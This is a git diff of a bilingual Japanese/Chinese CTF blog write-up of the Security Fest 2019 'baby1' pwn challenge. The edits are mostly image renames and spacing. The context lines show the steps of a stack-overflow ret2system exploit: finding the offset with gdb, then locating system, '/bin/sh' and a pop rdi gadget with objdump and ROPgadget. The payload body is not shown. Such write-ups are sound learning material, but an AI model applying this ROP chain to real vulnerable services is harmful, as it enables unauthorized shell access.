@@ -4,8 +4,8 @@ title:  2019 Security Fest CTF Write-up
 date:   2019-06-04 10:11:34 -0400
 categories: CTF
 ---
-今回のSecurity Fest CTF 2019で、私とSinonさんともう一人の友一緒にチームweRubb1shで参加しました。321 ptsで803チーム中で108位でした。私は一問を解けた。そして初めてpwnを解けた、でも私はまだまだですねw
-![result](/images/SecurityFest2019/result.JPG)
+今回のSecurity Fest CTF 2019で、私とSinonさんともう一人の友一緒にチームweRubb1shで参加しました。 321 ptsで803チーム中で108位でした。 私は一問を解けた。 そして初めてpwnを解けた、 でも私はまだまだですねw
+![result](/images/SecurityFest2019/SecurityFestCTF.JPG)
 
 這次是我第一次解掉pwn題，其實在Harekaze CTF 2019都在努力做，但一題也解不到
 
@@ -23,7 +23,6 @@ categories: CTF
 $gdb -q baby1
 gef> pattern create 150 #copy the string and paste to the input
 ```
-![patternCreate](/images/SecurityFest2019/patternCreate.PNG)
 
 之後跑那個program再input那段string，會有SIGSEGV的error出來
 ![gdbTest](/images/SecurityFest2019/gdbTest.PNG)
@@ -34,28 +33,25 @@ gef> x/gx $rsp
 0x7fffffffdf18: 0x6161616161616164
 gef> pattern offset 0x6161616161616164
 ```
-可以找得到要放24個A在前面
-![patternOffset](/images/SecurityFest2019/patternOffset.PNG)
-
 
 把program放了在ida看了看，裡面有一個function(?)是能夠call system。而且也有/bin/sh在裡面 (沒cap圖)
 用objdump把system的address找出來。其實也可以直接在objdump找有沒有system這東西
 ```bash
 objdump -d baby1 | grep "system"
 ```
-![objdumpSystem](/images/SecurityFest2019/objdumpSystem.PNG)
+![objdumpSystem](/images/SecurityFest2019/objdump_System.png)
 
 再用ROPgadget把/bin/sh的address找出來
 ```bash
 ROPgadget --binary baby1 --string "/bin/sh"
 ```
-![ROPbinsh](/images/SecurityFest2019/ROPbinsh.PNG)
+![ROPbinsh](/images/SecurityFest2019/ROPbinsh.png)
 
 將在做pop跟ret的address找出來，這次會用pop rdi，所以address是0x400793
 ```bash
 ROPgadget --binary baby1 --only "pop|ret"
 ```
-![ROPpopret](/images/SecurityFest2019/ROPpopret.PNG)
+![ROPpopret](/images/SecurityFest2019/ROPpopret.png)
 
 把找到的東西放在一起，以下是payload
 ```python
@@ -81,7 +77,7 @@ s.interactive()			#keep connection
 ```
 
 結果如下
-![runpayload](/images/SecurityFest2019/run.PNG)
+![runpayload](/images/SecurityFest2019/run.png)
 
 ***
 但其實我還不太明白整個原理是怎樣，還在摸索中
